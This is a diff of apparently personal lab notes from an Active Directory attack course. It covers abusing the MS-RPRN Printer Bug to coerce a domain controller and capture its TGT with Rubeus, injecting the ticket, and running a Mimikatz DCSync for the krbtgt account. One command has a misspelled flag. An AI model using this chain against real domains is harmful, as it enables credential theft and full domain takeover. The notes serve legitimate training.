@@ -153,7 +153,7 @@ C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
 ```
 
 >__Printer Bug__
-> MS-RPRN feature which _allows any domain authenticated user to force any machine , running the Spooler service, to connect to second a machine of the domain user's choice_.
+> MS-RPRN feature which _allows any domain authenticated user to force any machine , running the Spooler service, to connect to a second machine of the domain user's choice_.
 - We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug
 - We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
 ```powershell
@@ -165,5 +165,15 @@ MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local
 \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
-- From a Linux machine: [Coercer](https://github.com/p0dalirius/Coercer) for other MS protocols that can be abused for coercion.
-- 
+>From a Linux machine attack: [Coercer](https://github.com/p0dalirius/Coercer) for other MS protocols that can be abused for coercion.
+- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+```powershell
+Rubeus.exe ptt /tikcet:
+```
+
+- Once the ticket is injected, run DCSync:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
+```
+
+ 
